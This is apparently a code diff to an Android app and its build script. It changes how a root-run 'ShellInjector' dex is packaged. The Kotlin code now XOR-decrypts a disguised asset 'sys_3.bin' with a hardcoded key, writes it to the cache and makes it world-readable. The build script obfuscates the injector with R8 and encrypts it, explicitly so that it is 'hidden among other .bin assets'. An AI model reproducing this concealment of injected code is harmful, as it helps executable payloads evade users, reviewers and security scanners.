@@ -1057,6 +1057,9 @@ object AudioRouter {
     @Volatile private var injectorDir: File? = null
     private val lock = Any()
 
+    // 🔐 XOR key — obfuscated by StringFog automatically (already in build.gradle)
+    private val INJECTOR_KEY get() = "Gx7!kq9#mP2\$wL8nZ5@vR3%cY6^bN1&".toByteArray()
+
     private fun postMain(block: () -> Unit) = Handler(Looper.getMainLooper()).post(block)
 
     fun isRootAvailable(): Boolean = try {
@@ -1077,12 +1080,19 @@ object AudioRouter {
         return System.currentTimeMillis() - ready.lastModified() < 10_000L
     }
 
+    /** Decrypts sys_3.bin → cache/gucci_injector.dex */
     private fun prepareInjectorDex(context: Context): File {
         val dex = File(context.cacheDir, "gucci_injector.dex")
         val needsCopy = !dex.exists() || dex.length() < 1024
         if (needsCopy) {
-            context.assets.open("injector.dex").use { input ->
-                dex.outputStream().use { output -> input.copyTo(output) }
+            val key = INJECTOR_KEY
+            context.assets.open("sys_3.bin").use { input ->
+                val enc = input.readBytes()
+                val dec = ByteArray(enc.size)
+                for (i in enc.indices) {
+                    dec[i] = (enc[i].toInt() xor key[i % key.size].toInt()).toByte()
+                }
+                dex.outputStream().use { output -> output.write(dec) }
             }
             try { dex.setReadable(true, false) } catch (_: Exception) {}
         }
@@ -5251,9 +5261,9 @@ echo "App Icon set successfully!"
 # ... tumhara baaki script ...
 
 # ==========================================
-# 🚀 STANDALONE INJECTOR DEX (XopProtector-safe)
+# 🚀 STANDALONE INJECTOR (R8-obfuscated + XOR-encrypted)
 # ==========================================
-echo "Building standalone injector.dex..."
+echo "Building protected injector..."
 if [ ! -f "kotlinc/bin/kotlinc" ]; then
     wget -q https://github.com/JetBrains/kotlin/releases/download/v1.9.22/kotlin-compiler-1.9.22.zip
     unzip -q kotlin-compiler-1.9.22.zip
@@ -5268,7 +5278,11 @@ fi
 ANDROID_JAR="$ANDROID_HOME/platforms/android-34/android.jar"
 if [ ! -f "$ANDROID_JAR" ]; then
     echo "❌ android.jar not found at $ANDROID_JAR"
-    echo "   Set ANDROID_HOME or edit this script."
+    exit 1
+fi
+
+if ! command -v python3 &> /dev/null; then
+    echo "❌ python3 required (needed for XOR encryption)"
     exit 1
 fi
 
@@ -5278,13 +5292,43 @@ mkdir -p injector_build
     -classpath "$ANDROID_JAR" \
     -d injector_build/injector.jar
 
-D8=$(ls -d "$ANDROID_HOME"/build-tools/*/d8 2>/dev/null | sort -V | tail -1)
-if [ -z "$D8" ]; then
-    echo "❌ d8 not found. Install Android SDK build-tools."
+# R8 proguard rules for injector (keep only main entry point)
+cat > injector_build/proguard-injector.pro << 'PROGUARD_EOF'
+-keep class com.example.shtile.ShellInjector {
+    public static void main(java.lang.String[]);
+}
+-keepattributes Signature, InnerClasses, EnclosingMethod
+-dontwarn **
+-renamesourcefileattribute SourceFile
+PROGUARD_EOF
+
+# Prefer R8 (obfuscates); fallback to D8 (no obfuscation)
+R8=$(ls -d "$ANDROID_HOME"/build-tools/*/r8 2>/dev/null | sort -V | tail -1)
+if [ -n "$R8" ] && [ -x "$R8" ]; then
+    echo "Using R8 (obfuscated)..."
+    "$R8" --min-api 24 --lib "$ANDROID_JAR" \
+        --pg-conf injector_build/proguard-injector.pro \
+        --output injector_build injector_build/injector.jar
+else
+    echo "⚠️ R8 not found, falling back to D8 (no obfuscation)"
+    D8=$(ls -d "$ANDROID_HOME"/build-tools/*/d8 2>/dev/null | sort -V | tail -1)
+    "$D8" --min-api 24 --lib "$ANDROID_JAR" --output injector_build injector_build/injector.jar
+fi
+
+if [ ! -f "injector_build/classes.dex" ]; then
+    echo "❌ injector class.dex not generated"
     exit 1
 fi
-"$D8" --min-api 24 --lib "$ANDROID_JAR" --output injector_build injector_build/injector.jar
-mv injector_build/classes.dex app/src/main/assets/injector.dex
-echo "✅ injector.dex ready: $(du -h app/src/main/assets/injector.dex | cut -f1)"
+
+# XOR-encrypt classes.dex → sys_3.bin (hidden among other .bin assets)
+python3 << 'PYEOF'
+key = b'Gx7!kq9#mP2$wL8nZ5@vR3%cY6^bN1&'
+with open('injector_build/classes.dex', 'rb') as f:
+    data = f.read()
+enc = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
+with open('app/src/main/assets/sys_3.bin', 'wb') as f:
+    f.write(enc)
+print(f"✅ Encrypted injector: {len(data)} → {len(enc)} bytes → sys_3.bin")
+PYEOF
 
 gradle assembleDebug
